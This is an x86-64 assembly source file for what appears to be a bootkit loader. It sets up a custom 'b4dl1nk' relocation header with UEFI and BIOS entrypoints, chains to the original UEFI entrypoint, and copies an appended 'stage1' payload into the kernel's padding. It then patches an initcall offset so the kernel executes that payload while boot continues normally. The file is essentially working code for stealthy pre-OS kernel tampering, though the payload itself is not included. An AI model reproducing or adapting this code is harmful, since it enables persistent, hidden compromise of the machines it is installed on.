BITS 64


; This is a custom linking format just to make it easier to patch values in this
; directly.
_bad_link_header:
    db "b4dl1nk", 0
    dd (_bad_link_reloc_end - _bad_link_reloc_start) / 16
    dd _badlink_end

_bad_link_reloc_start:

; uefi entrypoint
    db "uefi_e", 0
    db 0x20 ; offset type, for reading
    dq _uefi_entry - _badlink_end

; bios entrypoint
    db "bios_e", 0
    db 0x20 ; offset type for reading.
    dq _bios_entry - _badlink_end

; original uefi entrypoint
    db "uefi_o", 0
    db 0x14
    dq _original_uefi_offset - _badlink_end

_bad_link_reloc_end:

    align 64, db 0x00

_badlink_end:



; Several ways we can reach this code, we just keep them at fixed offsets so we
; can adjust our patches to use them.

_bios_entry:
    jmp _start

    align 32, db 0xff

; Our goal here is to hook exit_boot_services, then continue boot as normal.
_uefi_entry:
    ; jmp _uefi_entry
; lets call the original entrypoint
    db 0xe8
; call offset
_original_uefi_offset:
    db 0x00, 0x00, 0x00, 0x00

    align 32, db 0xff
; just some instructions we patched out, doing it here to make the patch
; cleaner.
    mov rsi, rbx
    add rax, rcx
    
; Now onto our real start:
_start:
    ; align 8192, db 0x90

    push rax
    push rcx
    push rdi
    push rsi

; now we need patch the kernel and get stage1 in a suitable place.
 
; so the kernel pads sections with 0xcc, with a 0x20_00_00 alignment, so we
; have a ton of free space to place a payload.
; %define _stage1_offset 0x01_30_00_00
    lea rsi, [rel stage1]
    lea rdi, [rax + _stage1_offset]
    mov rcx, stage1_len
    rep movsb


; hook initcall to call our stage1
; %define _initcall_offset 0x02_b6_ee_08
    ; (rax + _initcall_offset + value)
    ; 0xffdd6d48
    mov edi, _stage1_offset - _initcall_offset
    mov dword [rax + _initcall_offset], edi

; now we can transfer control over
    pop rsi
    pop rdi
    pop rcx
    pop rax
    jmp rax

; stage 1 will be appended
stage1:
